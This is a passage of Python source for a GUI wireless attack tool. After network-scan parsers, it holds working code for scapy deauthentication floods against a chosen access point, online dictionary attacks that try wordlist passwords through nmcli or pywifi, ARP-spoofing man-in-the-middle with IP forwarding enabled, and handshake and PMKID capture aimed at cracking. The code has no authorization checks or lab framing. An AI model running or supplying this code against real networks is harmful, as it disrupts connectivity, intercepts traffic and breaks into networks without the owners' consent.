                    "auth": str(ap.auth) if hasattr(ap, 'auth') else "",
                    "clients": [],
                })
        except ImportError:
            self.root.after(0, self._log, "pywifi not available. No scan method found.", "err")
        
        return networks
    
    def _parse_iw_scan(self, output: str) -> List[Dict]:
        """Parse 'iw dev wlan0 scan' output into structured data."""
        networks = []
        current = {}
        
        for line in output.split('\n'):
            if line.startswith('BSS '):
                if current and 'ssid' in current and current['ssid']:
                    networks.append(current)
                current = {'bssid': line.split()[1].strip(), 'clients': [], 'wps': False, 'vendor': ''}
            elif 'SSID:' in line:
                current['ssid'] = line.split('SSID:')[-1].strip()
            elif 'signal:' in line:
                parts = line.split('signal:')
                if len(parts) > 1:
                    val = parts[1].strip().split()[0]
                    try:
                        current['signal'] = float(val)
                    except ValueError:
                        current['signal'] = -90
            elif 'freq:' in line:
                parts = line.split('freq:')
                if len(parts) > 1:
                    freq = parts[1].strip().split()[0]
                    try:
                        current['channel'] = self._freq_to_channel(float(freq))
                    except ValueError:
                        current['channel'] = 0
            elif 'WPA:' in line:
                current['encryption'] = 'WPA'
            elif 'RSN:' in line:
                current['encryption'] = 'WPA2'
            elif 'WPS:' in line or 'wps' in line.lower():
                current['wps'] = True
            elif 'Beacon' in line and 'IE:' in line:
                current['vendor'] = line.split('IE:')[-1].strip()[:30] if 'IE:' in line else ''
        
        if current and 'ssid' in current and current['ssid']:
            networks.append(current)
        
        return networks
    
    def _parse_iwlist_scan(self, output: str) -> List[Dict]:
        """Parse iwlist scan output (older Linux systems)."""
        networks = []
        current = {}
        in_cell = False
        
        for line in output.split('\n'):
            if 'Cell' in line and '-' in line:
                if current and 'ssid' in current:
                    networks.append(current)
                current = {'clients': [], 'wps': False, 'vendor': ''}
                # Extract BSSID
                parts = line.split()
                for p in parts:
                    if ':' in p and len(p) == 17:
                        current['bssid'] = p
                in_cell = True
            elif 'ESSID:' in line:
                ssid = line.split('ESSID:"')[-1].rstrip('"')
                current['ssid'] = ssid
            elif 'Signal level' in line:
                match = re.search(r'Signal level[=:](-?\d+)', line)
                if match:
                    current['signal'] = float(match.group(1))
            elif 'Channel' in line:
                match = re.search(r'Channel[=:](\d+)', line)
                if match:
                    current['channel'] = int(match.group(1))
            elif 'Encryption key:on' in line:
                if 'encryption' not in current:
                    current['encryption'] = 'WPA2'
            elif 'Encryption key:off' in line:
                current['encryption'] = 'OPEN'
            elif 'WPA2' in line or 'IEEE 802.11i' in line:
                current['encryption'] = 'WPA2'
            elif 'WPA' in line:
                current['encryption'] = 'WPA'
        
        if current and 'ssid' in current and current['ssid']:
            networks.append(current)
        
        return networks
    
    def _parse_airport_scan(self, output: str) -> List[Dict]:
        """Parse macOS airport scan output."""
        networks = []
        lines = output.strip().split('\n')
        
        for line in lines[1:]:  # Skip header
            parts = line.split()
            if len(parts) >= 5:
                ssid = parts[0]
                # Handle SSIDs with spaces (airport doesn't quote them well)
                # Real parsing would need the column positions, but this is a best-effort
                bssid = parts[1] if len(parts) > 1 and ':' in parts[1] else ''
                sig = 0
                ch = 0
                enc = 'UNKNOWN'
                
                for i, part in enumerate(parts):
                    if part.startswith('-') and part[1:].isdigit() and len(part) <= 4:
                        sig = int(part)
                    elif part.isdigit() and 1 <= int(part) <= 165:
                        ch = int(part)
                    elif part in ('WPA2', 'WPA3', 'WPA', 'WEP', 'OPEN', 'NONE'):
                        enc = part
                
                # Find encryption by position (usually last columns)
                for part in reversed(parts):
                    if part in ('WPA2', 'WPA3', 'WPA', 'WEP', 'OPEN', 'NONE'):
                        enc = part
                        break
                
                networks.append({
                    "ssid": ssid,
                    "bssid": bssid,
                    "signal": sig,
                    "channel": ch,
                    "encryption": enc,
                    "clients": [],
                    "wps": False,
                })
        
        return networks
    
    def _parse_netsh_scan(self, output: str) -> List[Dict]:
        """Parse Windows netsh wlan show networks mode=Bssid output."""
        networks = []
        current = {}
        
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('SSID'):
                if current and 'ssid' in current:
                    networks.append(current)
                current = {'ssid': line.split(':')[1].strip(), 'clients': [], 'wps': False}
            elif line.startswith('BSSID'):
                current['bssid'] = line.split(':')[1].strip().replace('-', ':')
            elif line.startswith('Signal'):
                sig_text = line.split(':')[-1].strip().rstrip('%')
                try:
                    pct = int(sig_text)
                    current['signal'] = -30 - int((100 - pct) * 0.6)
                except ValueError:
                    current['signal'] = -90
            elif line.startswith('Channel'):
                try:
                    current['channel'] = int(line.split(':')[-1].strip())
                except ValueError:
                    current['channel'] = 0
            elif 'Authentication' in line:
                auth = line.split(':')[-1].strip()
                if auth == 'WPA2-Personal' or auth == 'WPA2-Enterprise':
                    current['encryption'] = 'WPA2'
                elif auth == 'WPA3':
                    current['encryption'] = 'WPA3'
                elif 'WPA' in auth:
                    current['encryption'] = 'WPA'
                elif auth == 'WEP':
                    current['encryption'] = 'WEP'
                elif auth == 'Open':
                    current['encryption'] = 'OPEN'
                else:
                    current['encryption'] = auth
        
        if current and 'ssid' in current:
            networks.append(current)
        
        return networks
    
    def _parse_nmcli_scan(self, output: str) -> List[Dict]:
        """Parse nmcli -t output into structured data."""
        networks = []
        
        for line in output.strip().split('\n'):
            if not line.strip():
                continue
            parts = line.split(':')
            if len(parts) >= 5:
                ssid, bssid, ch, signal, security = parts[:5]
                try:
                    sig = -30 - int((100 - int(signal)) * 0.6)
                except ValueError:
                    sig = -80
                
                networks.append({
                    "ssid": ssid,
                    "bssid": bssid,
                    "signal": sig,
                    "channel": int(ch) if ch.isdigit() else 0,
                    "encryption": security if security and security != '--' else 'OPEN',
                    "clients": [],
                    "wps": False,
                })
        
        return networks
    
    def _parse_arp(self, output: str) -> int:
        """Parse 'arp -a' output and return client count."""
        count = 0
        for line in output.split('\n'):
            if '(' in line and ')' in line:
                count += 1
        return max(0, count - 1)  # Subtract gateway
    
    @staticmethod
    def _freq_to_channel(freq: float) -> int:
        """Convert frequency in MHz to channel number."""
        if 2412 <= freq <= 2484:
            return int((freq - 2407) / 5)
        elif 5180 <= freq <= 5825:
            return int((freq - 5000) / 5)
        return 0
    
    def _scan_complete(self):
        """Called when scan finishes (on main thread)."""
        self._scan_in_progress = False
        self._stop_events.pop("scan", None)
        
        self.btn_scan.config(state=tk.NORMAL, text="START SCAN")
        self.btn_scan_stop.config(state=tk.DISABLED)
        self.op_progress.stop()
        self.op_progress.pack_forget()
        self.op_status_label.config(text="● Ready", fg=HACKER_THEME["status_ready"])
        self.footer_mode.config(text="Mode: Ready", fg=HACKER_THEME["fg_primary"])
    
    def _stop_scan(self):
        """Stop an ongoing scan."""
        stop_event = self._stop_events.get("scan")
        if stop_event:
            stop_event.set()
            self._log("Scan cancelled by user.", "warn")
    
    def _update_network_tree(self, networks: List[Dict]):
        """Update the network Treeview with scan results (main thread only)."""
        self._networks = networks
        
        # Clear existing items
        for item in self.net_tree.get_children():
            self.net_tree.delete(item)
        self._network_items.clear()
        
        # Sort by signal strength (strongest first)
        networks_sorted = sorted(networks, key=lambda n: n.get('signal', -100), reverse=True)
        
        for i, net in enumerate(networks_sorted):
            sig = net.get('signal', -100)
            sig_pct = max(0, min(100, int((sig + 90) / 60 * 100)))
            
            # Signal bars (text-based)
            if sig_pct >= 80:
                signal_display = f"{'█' * 4} {sig_pct}%"
                sig_tag = "signal_high"
            elif sig_pct >= 60:
                signal_display = f"{'█' * 3}▒ {sig_pct}%"
                sig_tag = "signal_med"
            elif sig_pct >= 40:
                signal_display = f"{'█' * 2}▒▒ {sig_pct}%"
                sig_tag = "signal_low"
            else:
                signal_display = f"▒▒▒▒ {sig_pct}%"
                sig_tag = "signal_low"
            
            enc = net.get('encryption', 'UNKNOWN')
            if 'WPA3' in enc:
                enc_tag = "wpa3"
            elif 'WPA2' in enc:
                enc_tag = "wpa2"
            elif 'WPA' in enc:
                enc_tag = "wpa"
            elif 'WEP' in enc:
                enc_tag = "wep"
            elif 'OPEN' in enc or not enc:
                enc_tag = "open"
            else:
                enc_tag = ""
            
            wps = "✓" if net.get('wps') else ""
            clients = str(len(net.get('clients', []))) if net.get('clients') else "0"
            
            row_tags = ("even", sig_tag, enc_tag) if i % 2 == 0 else ("odd", sig_tag, enc_tag)
            
            iid = self.net_tree.insert(
                "", tk.END,
                values=(
                    net.get('ssid', '?'),
                    net.get('bssid', '?'),
                    str(net.get('channel', '?')),
                    signal_display,
                    enc,
                    wps,
                    clients,
                ),
                tags=row_tags,
            )
            
            self._network_items[iid] = net
        
        # Update counters
        self.net_count_label.config(text=f"{len(networks)} APs")
        
        # Update footer stats
        total_clients = sum(len(n.get('clients', [])) for n in networks)
        self.footer_aps.config(text=f"APs: {len(networks)}")
        self.footer_clients.config(text=f"Clients: {total_clients}")
        
        # Update stats label
        wpa3 = sum(1 for n in networks if 'WPA3' in n.get('encryption', ''))
        wpa2 = sum(1 for n in networks if 'WPA2' in n.get('encryption', ''))
        open_nets = sum(1 for n in networks if 'OPEN' in n.get('encryption', '') or not n.get('encryption'))
        
        self.net_stats_label.config(
            text=f"WPA3: {wpa3} | WPA2: {wpa2} | OPEN: {open_nets} | Total: {len(networks)}"
        )
    
    def _update_client_count(self, count: int):
        """Update client count from ARP scan."""
        self.footer_clients.config(text=f"Clients: {count}")
    
    def _filter_networks(self):
        """Filter the network tree by search term."""
        query = self.search_var.get().lower().strip()
        
        for iid, net in self._network_items.items():
            ssid = net.get('ssid', '').lower()
            bssid = net.get('bssid', '').lower()
            
            if not query or query in ssid or query in bssid:
                self.net_tree.reattach(iid, "", tk.END)  # Show
            else:
                self.net_tree.detach(iid)  # Hide
    
    def _sort_treeview(self, col: str):
        """Sort treeview by column."""
        items = [(self.net_tree.set(item, col), item) for item in self.net_tree.get_children("")]
        items.sort(key=lambda x: self._sort_key(x[0], col))
        
        for index, (val, item) in enumerate(items):
            self.net_tree.move(item, "", index)
    
    @staticmethod
    def _sort_key(value: str, col: str) -> Any:
        """Generate sort key for treeview sorting."""
        if col == "ch":
            try:
                return int(value)
            except ValueError:
                return 0
        elif col == "signal":
            # Extract percentage from "████ 95%"
            match = re.search(r'(\d+)%', value)
            if match:
                try:
                    return int(match.group(1))
                except ValueError:
                    return 0
            return 0
        elif col == "clients":
            try:
                return int(value)
            except ValueError:
                return 0
        return value.lower()
    
    # ========================================================================
    # NETWORK SELECTION
    # ========================================================================
    
    def _on_network_select(self, event):
        """Handle network selection in the Treeview."""
        selection = self.net_tree.selection()
        if not selection:
            return
        
        iid = selection[0]
        net = self._network_items.get(iid)
        if not net:
            return
        
        self._selected_network = net
        
        # Update target info
        self.target_ssid_var.set(net.get('ssid', '?'))
        self.target_bssid_var.set(net.get('bssid', '?'))
        
        sig = net.get('signal', -100)
        sig_pct = max(0, min(100, int((sig + 90) / 60 * 100)))
        ch = net.get('channel', '?')
        enc = net.get('encryption', '?')
        
        self.target_info_var.set(f"CH {ch} | {sig_pct}% | {enc}")
        
        self._log(f"Selected: {net.get('ssid', '?')} ({net.get('bssid', '?')})", "info")
    
    def _on_right_click(self, event):
        """Show right-click context menu for network."""
        iid = self.net_tree.identify_row(event.y)
        if not iid:
            return
        
        self.net_tree.selection_set(iid)
        net = self._network_items.get(iid)
        if not net:
            return
        
        menu = tk.Menu(self.root, tearoff=0, bg=HACKER_THEME["bg_medium"], fg=HACKER_THEME["fg_primary"],
                       activebackground=HACKER_THEME["bg_selected"], activeforeground=HACKER_THEME["fg_bright"])
        
        menu.add_command(label="🎯 Select Target", command=lambda: self._on_network_select(None))
        menu.add_separator()
        menu.add_command(label="⚡ Deauth Attack", command=lambda: self._queue_attack("deauth", net))
        menu.add_command(label="📥 Capture Handshake", command=lambda: self._queue_attack("capture", net))
        menu.add_command(label="🔓 Crack Password", command=lambda: self._queue_attack("crack", net))
        menu.add_separator()
        menu.add_command(label="📋 Copy BSSID", command=lambda: self._copy_to_clipboard(net.get('bssid', '')))
        menu.add_command(label="📋 Copy SSID", command=lambda: self._copy_to_clipboard(net.get('ssid', '')))
        
        try:
            menu.tk_popup(event.x_root, event.y_root)
        finally:
            menu.grab_release()
    
    def _copy_to_clipboard(self, text: str):
        """Copy text to system clipboard."""
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        self._log(f"Copied: {text}", "info")
    
    def _queue_attack(self, attack_type: str, net: Dict):
        """Queue an attack from right-click context menu."""
        self._selected_network = net
        self._on_network_select(None)
        
        if attack_type == "deauth":
            self.attack_type_var.set("Deauth")
            self.root.after(100, self._start_attack)
        elif attack_type == "capture":
            self.root.after(100, self._start_capture)
        elif attack_type == "crack":
            self.root.after(100, self._start_crack)
    
    # ========================================================================
    # ATTACK OPERATIONS (Threaded)
    # ========================================================================
    
    def _start_attack(self):
        """Start an attack in a background thread."""
        if self._attack_in_progress:
            self._log("Attack already in progress.", "warn")
            return
        
        if not self._selected_network:
            self._log("No target network selected.", "warn")
            return
        
        self._attack_in_progress = True
        self._stop_events["attack"] = threading.Event()
        
        attack_type = self.attack_type_var.get()
        
        self.btn_attack.config(state=tk.DISABLED, text=f"▶ {attack_type}...")
        self.btn_attack_stop.config(state=tk.NORMAL)
        self.op_status_label.config(text=f"● Attacking... ({attack_type})", fg=HACKER_THEME["status_busy"])
        self.op_progress.pack(fill=tk.X, side=tk.BOTTOM, padx=8, pady=(0, 4))
        self.op_progress.start(10)
        self.footer_mode.config(text=f"Mode: ATTACK ({attack_type})", fg=HACKER_THEME["fg_red"])
        
        self._log(f"Starting {attack_type} attack on {self._selected_network.get('ssid', '?')}", "info")
        
        thread = threading.Thread(
            target=self._attack_worker,
            args=(attack_type,),
            daemon=True,
            name="attack-worker",
        )
        self._threads["attack"] = thread
        thread.start()
    
    def _attack_worker(self, attack_type: str):
        """Background attack worker."""
        stop_event = self._stop_events.get("attack")
        net = self._selected_network
        
        try:
            if attack_type == "Deauth":
                self._deauth_worker(net, stop_event)
            elif attack_type == "MITM":
                self._mitm_worker(net, stop_event)
            elif attack_type == "Dictionary":
                self._dictionary_attack_worker(net, stop_event)
            elif attack_type == "Smart":
                self._smart_attack_worker(net, stop_event)
        except Exception as e:
            self.root.after(0, self._log, f"Attack failed: {e}", "err")
        finally:
            self.root.after(0, self._attack_complete)
    
    def _deauth_worker(self, net: Dict, stop_event: threading.Event):
        """Execute deauth attack."""
        bssid = net.get('bssid', '')
        if not bssid:
            self.root.after(0, self._log, "No BSSID for deauth target.", "err")
            return
        
        if not CAN_INJECT_PACKETS:
            self.root.after(0, self._log, "Packet injection not available on this platform.", "err")
            return
        
        count = int(self.deauth_count_var.get()) if self.deauth_count_var.get().isdigit() else 10
        continuous = self.continuous_var.get()
        
        self.root.after(0, self._log, f"Deauth: {count} packets to {bssid} (continuous: {continuous})", "info")
        
        # Try to use scapy for deauth
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            
            # Construct deauth packet
            pkt = RadioTap() / Dot11(
                type=0, subtype=12,
                addr1="FF:FF:FF:FF:FF:FF",
                addr2=bssid,
                addr3=bssid,
            ) / Dot11Deauth(reason=7)
            
            if continuous:
                self.root.after(0, self._log, "Continuous deauth: sending every 0.5s. Press STOP to end.", "info")
                while not stop_event.is_set():
                    sendp(pkt, inter=0.5, count=1, verbose=False)
                    self.root.after(0, self.footer_packets.config, 
                                    text=f"Pkts: ~{count}+")
            else:
                for i in range(count):
                    if stop_event.is_set():
                        break
                    sendp(pkt, inter=0.1, count=1, verbose=False)
                    if i % 5 == 0:
                        self.root.after(0, self._log, f"Deauth packets sent: {i+1}/{count}", "deauth")
                        self.root.after(0, self.footer_packets.config, text=f"Pkts: {i+1}")
                
                self.root.after(0, self._log, f"Deauth complete: {count} packets sent.", "ok")
        
        except ImportError:
            self.root.after(0, self._log, "scapy not available. Cannot send deauth packets.", "err")
    
    def _mitm_worker(self, net: Dict, stop_event: threading.Event):
        """Execute MITM ARP spoof attack."""
        # Would need victim/gateway IPs — prompt user
        self.root.after(0, lambda: self._prompt_mitm_ips())
    
    def _dictionary_attack_worker(self, net: Dict, stop_event: threading.Event):
        """Execute dictionary attack against target network."""
        ssid = net.get('ssid', '')
        wordlist = self.wordlist_var.get()
        
        if not os.path.exists(wordlist):
            self.root.after(0, self._log, f"Wordlist not found: {wordlist}", "err")
            return
        
        # Count lines for progress estimation
        try:
            with open(wordlist, 'r', errors='ignore') as f:
                total_lines = sum(1 for _ in f)
        except Exception:
            total_lines = 0
        
        self.root.after(0, self._log, f"Dictionary attack: {ssid} with {total_lines:,} passwords", "info")
        
        attempt = 0
        try:
            with open(wordlist, 'r', errors='ignore') as f:
                for password in f:
                    if stop_event.is_set():
                        self.root.after(0, self._log, f"Dictionary attack stopped at attempt {attempt:,}.", "warn")
                        return
                    
                    password = password.strip()
                    if not password:
                        continue
                    
                    attempt += 1
                    
                    # Try the password (platform-dependent)
                    if self._try_wifi_password(ssid, password):
                        self.root.after(0, self._log, f"🔓 PASSWORD FOUND: {password}", "found")
                        self.root.after(0, self._show_password_found, password)
                        return
                    
                    if attempt % 100 == 0:
                        progress = f"{attempt:,}/{total_lines:,} ({attempt*100//max(1,total_lines)}%)"
                        self.root.after(0, self.footer_packets.config, text=f"Attempts: {progress}")
                    
                    if attempt >= 1000 and not self._check_wifi_connectivity():
                        self.root.after(0, self._log, "WiFi connectivity lost. Aborting attack.", "err")
                        return
            
            self.root.after(0, self._log, f"Dictionary attack complete: {attempt:,} attempts, no match.", "warn")
        
        except Exception as e:
            self.root.after(0, self._log, f"Dictionary attack error: {e}", "err")
    
    def _smart_attack_worker(self, net: Dict, stop_event: threading.Event):
        """Smart attack — auto-select best vector."""
        self.root.after(0, self._log, "Smart attack: analyzing target...", "info")
        
        # Check WPS
        if net.get('wps') and IS_LINUX and CAN_PIXIEDUST:
            self.root.after(0, self._log, "→ WPS enabled! Attempting PixieDust...", "info")
            # Would call reaver/bully here
            return
        
        # Check PMKID
        # For now, fall back to dictionary
        self.root.after(0, self._log, "→ Using dictionary attack.", "info")
        self._dictionary_attack_worker(net, stop_event)
    
    def _try_wifi_password(self, ssid: str, password: str) -> bool:
        """Try to connect to a WiFi network with a password.
        
        Platform-adaptive: uses nmcli on Linux, pywifi on Windows.
        
        Args:
            ssid: Network SSID
            password: Password to try
        
        Returns:
            True if connection succeeded, False otherwise.
        """
        if IS_LINUX:
            return self._try_password_nmcli(ssid, password)
        elif IS_WINDOWS:
            return self._try_password_pywifi(ssid, password)
        else:
            # macOS — limited support
            return False
    
    def _try_password_nmcli(self, ssid: str, password: str) -> bool:
        """Try password using nmcli on Linux."""
        try:
            # Create temporary connection
            conn_name = f"medusa_{int(time.time())}"
            
            result = subprocess.run(
                ["nmcli", "dev", "wifi", "connect", ssid, "password", password],
                capture_output=True, text=True, timeout=10,
            )
            
            if result.returncode == 0:
                # Success! Clean up the connection
                subprocess.run(
                    ["nmcli", "connection", "delete", conn_name],
                    capture_output=True, timeout=3,
                )
                return True
            
            return False
        
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False
    
    def _try_password_pywifi(self, ssid: str, password: str) -> bool:
        """Try password using pywifi on Windows."""
        try:
            import pywifi
            from pywifi import const
            
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            
            # Disconnect first
            iface.disconnect()
            time.sleep(0.5)
            
            # Create profile
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            # Remove all existing profiles
            iface.remove_all_network_profiles()
            
            # Add and connect
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            time.sleep(2)
            
            if iface.status() == const.IFACE_CONNECTED:
                iface.disconnect()
                return True
            
            return False
        
        except ImportError:
            return False
    
    def _check_wifi_connectivity(self) -> bool:
        """Check if WiFi interface is still operational."""
        if IS_LINUX:
            try:
                result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=3)
                return 'IEEE' in result.stdout
            except Exception:
                return True  # Assume connected
        return True
    
    def _attack_complete(self):
        """Called when attack finishes (main thread)."""
        self._attack_in_progress = False
        self._stop_events.pop("attack", None)
        
        self.btn_attack.config(state=tk.NORMAL, text="▶ EXECUTE ATTACK")
        self.btn_attack_stop.config(state=tk.DISABLED)
        self.op_progress.stop()
        self.op_progress.pack_forget()
        
        if not self._crack_in_progress and not self._capture_in_progress:
            self.op_status_label.config(text="● Ready", fg=HACKER_THEME["status_ready"])
            self.footer_mode.config(text="Mode: Ready", fg=HACKER_THEME["fg_primary"])
    
    def _stop_attack(self):
        """Stop an ongoing attack."""
        stop_event = self._stop_events.get("attack")
        if stop_event:
            stop_event.set()
            self._log("Attack stopped by user.", "warn")
    
    def _prompt_mitm_ips(self):
        """Prompt user for MITM victim/gateway IPs."""
        dialog = tk.Toplevel(self.root)
        dialog.title("MITM Configuration")
        dialog.geometry("400x200")
        dialog.configure(bg=HACKER_THEME["bg_dark"])
        dialog.transient(self.root)
        dialog.grab_set()
        
        tk.Label(dialog, text="Victim IP:", font=("Consolas", 10),
                fg=HACKER_THEME["fg_primary"], bg=HACKER_THEME["bg_dark"]).pack(pady=(20, 5))
        victim_entry = tk.Entry(dialog, font=("Consolas", 10), width=20,
                               bg=HACKER_THEME["entry_bg"], fg=HACKER_THEME["entry_fg"],
                               insertbackground=HACKER_THEME["entry_insert"])
        victim_entry.pack(pady=5)
        
        tk.Label(dialog, text="Gateway IP:", font=("Consolas", 10),
                fg=HACKER_THEME["fg_primary"], bg=HACKER_THEME["bg_dark"]).pack(pady=5)
        gateway_entry = tk.Entry(dialog, font=("Consolas", 10), width=20,
                                bg=HACKER_THEME["entry_bg"], fg=HACKER_THEME["entry_fg"],
                                insertbackground=HACKER_THEME["entry_insert"])
        gateway_entry.pack(pady=5)
        
        def submit():
            victim = victim_entry.get().strip()
            gateway = gateway_entry.get().strip()
            if victim and gateway:
                dialog.destroy()
                self._execute_mitm(victim, gateway)
            else:
                self._log("MITM requires both victim and gateway IPs.", "err")
                dialog.destroy()
        
        tk.Button(dialog, text="START MITM", font=("Consolas", 10, "bold"),
                 bg=HACKER_THEME["button_bg"], fg=HACKER_THEME["fg_red"],
                 command=submit).pack(pady=15)
    
    def _execute_mitm(self, victim_ip: str, gateway_ip: str):
        """Execute MITM attack with given IPs."""
        self._log(f"Starting MITM: {victim_ip} ↔ {gateway_ip}", "mitm")
        
        # Get interface
        iface = self._get_best_interface()
        self._log(f"Using interface: {iface}", "info")
        
        # Enable IP forwarding
        self._enable_ip_forward()
        
        try:
            from scapy.all import ARP, Ether, sendp
            from scapy.all import conf as scapy_conf
            
            scapy_conf.iface = iface
            
            stop_event = self._stop_events.get("attack")
            
            self._log("ARP spoofing active. Intercepting traffic...", "mitm")
            
            while not stop_event.is_set():
                # Spoof victim (tell victim that we are gateway)
                victim_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, pdst=victim_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"
                )
                sendp(victim_pkt, verbose=False)
                
                # Spoof gateway (tell gateway that we are victim)
                gateway_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, pdst=gateway_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff"
                )
                sendp(gateway_pkt, verbose=False)
                
                time.sleep(2)
        
        except ImportError:
            self._log("scapy not available for MITM.", "err")
        finally:
            self._disable_ip_forward()
            self._log("MITM stopped.", "warn")
    
    def _enable_ip_forward(self):
        """Enable IP forwarding for MITM."""
        if IS_LINUX:
            try:
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                             capture_output=True, timeout=3)
            except Exception:
                pass
        elif IS_WINDOWS:
            try:
                subprocess.run(["powershell", "-Command",
                               "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' -Name IpEnableRouter -Value 1"],
                             capture_output=True, timeout=5)
            except Exception:
                pass
    
    def _disable_ip_forward(self):
        """Disable IP forwarding."""
        if IS_LINUX:
            try:
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                             capture_output=True, timeout=3)
            except Exception:
                pass
        elif IS_WINDOWS:
            try:
                subprocess.run(["powershell", "-Command",
                               "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' -Name IpEnableRouter -Value 0"],
                             capture_output=True, timeout=5)
            except Exception:
                pass
    
    def _get_best_interface(self) -> str:
        """Get the best available network interface."""
        if IS_LINUX:
            try:
                result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        return line.split()[-1].strip()
            except Exception:
                pass
        elif IS_WINDOWS:
            try:
                result = subprocess.run(["wmic", "nic", "get", "NetConnectionID"],
                                       capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'Wi-Fi' in line or 'Wireless' in line:
                        return line.strip()
            except Exception:
                pass
        
        return "wlan0" if IS_LINUX else "en0" if IS_MACOS else "Wi-Fi"
    
    # ========================================================================
    # CAPTURE OPERATIONS (Threaded)
    # ========================================================================
    
    def _start_capture(self):
        """Start packet capture in background thread."""
        if self._capture_in_progress:
            self._log("Capture already in progress.", "warn")
            return
        
        self._capture_in_progress = True
        self._stop_events["capture"] = threading.Event()
        
        self.btn_capture.config(state=tk.DISABLED, text="CAPTURING...")
        self.btn_capture_stop.config(state=tk.NORMAL)
        self.op_status_label.config(text="● Capturing...", fg=HACKER_THEME["status_busy"])
        self.op_progress.pack(fill=tk.X, side=tk.BOTTOM, padx=8, pady=(0, 4))
        self.op_progress.start(10)
        self.footer_mode.config(text="Mode: CAPTURE", fg=HACKER_THEME["fg_cyan"])
        
        self._log("Starting packet capture...", "info")
        
        thread = threading.Thread(target=self._capture_worker, daemon=True, name="capture-worker")
        self._threads["capture"] = thread
        thread.start()
    
    def _capture_worker(self):
        """Background packet capture worker."""
        stop_event = self._stop_events.get("capture")
        timeout = int(self.capture_timeout_var.get()) if self.capture_timeout_var.get().isdigit() else 60
        filter_type = self.capture_filter_var.get()
        bssid = self._selected_network.get('bssid', '') if self._selected_network else ''
        ssid = self._selected_network.get('ssid', '') if self._selected_network else ''
        
        output_file = str(CAPTURE_DIR / f"capture_{current_timestamp('file')}.pcap")
        CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
        
        self.root.after(0, self._log, f"Capture: {filter_type} filter, {timeout}s timeout", "info")
        self.root.after(0, self._log, f"Output: {output_file}", "info")
        
        packets_count = 0
        handshake_found = False
        pmkid_found = False
        
        try:
            from scapy.all import sniff, wrpcap, Dot11, Dot11Elt, EAPOL, Packet
            
            def packet_handler(pkt):
                nonlocal packets_count, handshake_found, pmkid_found
                
                if stop_event and stop_event.is_set():
                    return True  # Stop sniffing
                
                packets_count += 1
                
                # Check for EAPOL (handshake)
                if EAPOL in pkt:
                    handshake_found = True
                    self.root.after(0, self._log, f"[🔥] EAPOL frame captured! ({pkt.summary()[:80]})", "found")
                
                # Check for PMKID
                if Dot11 in pkt and Dot11Elt in pkt:
                    elt = pkt[Dot11Elt]
                    if elt.ID == 48:  # RSN IE
                        pmkid_found = True
                        self.root.after(0, self._log, "[🔥] PMKID detected in association frame!", "found")
                
                # Periodic status update
                if packets_count % 100 == 0:
                    self.root.after(0, self.footer_packets.config, text=f"Pkts: {packets_count}")
            
            # Build BPF filter based on filter_type
            bpf_filter = None
            if filter_type == "handshake":
                bpf_filter = "ether proto 0x888e"  # EAPOL only
            elif filter_type == "http":
                bpf_filter = "tcp port 80 or tcp port 443"
            
            self.root.after(0, self._log, f"Sniffing started (timeout: {timeout}s)...", "info")
            
            # Sniff with timeout
            packets = sniff(
                prn=packet_handler,
                store=True,
                timeout=timeout,
                filter=bpf_filter,
                stop_filter=lambda p: stop_event.is_set() if stop_event else False,
            )
            
            # Save capture
            if packets:
                wrpcap(output_file, packets)
                size = os.path.getsize(output_file)
                self.root.after(0, self._log, f"Capture saved: {output_file} ({human_bytes(size)})", "ok")
            
            # Report results
            self.root.after(0, self.footer_packets.config, text=f"Pkts: {packets_count}")
            
            if handshake_found:
                self.root.after(0, self._log, "✅ WPA HANDSHAKE CAPTURED!", "success")
            if pmkid_found:
                self.root.after(0, self._log, "✅ PMKID CAPTURED! Ready for hashcat (mode 16800).", "success")
            if not handshake_found and not pmkid_found:
                self.root.after(0, self._log, f"Capture complete: {packets_count} packets, no handshake found.", "info")
            
        except ImportError:
            self.root.after(0, self._log, "scapy not available for packet capture.", "err")
        except Exception as e:
            self.root.after(0, self._log, f"Capture error: {e}", "err")
        finally:
            self.root.after(0, self._capture_complete)
    
    def _capture_complete(self):
        """Called when capture finishes (main thread)."""
        self._capture_in_progress = False
        self._stop_events.pop("capture", None)
        
        self.btn_capture.config(state=tk.NORMAL, text="▶ START CAPTURE")
        self.btn_capture_stop.config(state=tk.DISABLED)
        
        if not self._attack_in_progress and not self._crack_in_progress:
            self.op_progress.stop()
            self.op_progress.pack_forget()
            self.op_status_label.config(text="● Ready", fg=HACKER_THEME["status_ready"])
            self.footer_mode.config(text="Mode: Ready", fg=HACKER_THEME["fg_primary"])
    
    def _stop_capture(self):
        """Stop an ongoing capture."""
        stop_event = self._stop_events.get("capture")
        if stop_event:
            stop_event.set()
            self._log("Capture stopped by user.", "warn")
    
    # ========================================================================
    # CRACK OPERATIONS (Threaded)
    # ========================================================================
    
    def _start_crack(self):
        """Start cracking in background thread."""
        if self._crack_in_progress:
            self._log("Cracking already in progress.", "warn")
            return
        
        self._crack_in_progress = True
        self._stop_events["crack"] = threading.Event()
        
        self.btn_crack.config(state=tk.DISABLED, text="CRACKING...")
        self.btn_crack_stop.config(state=tk.NORMAL)
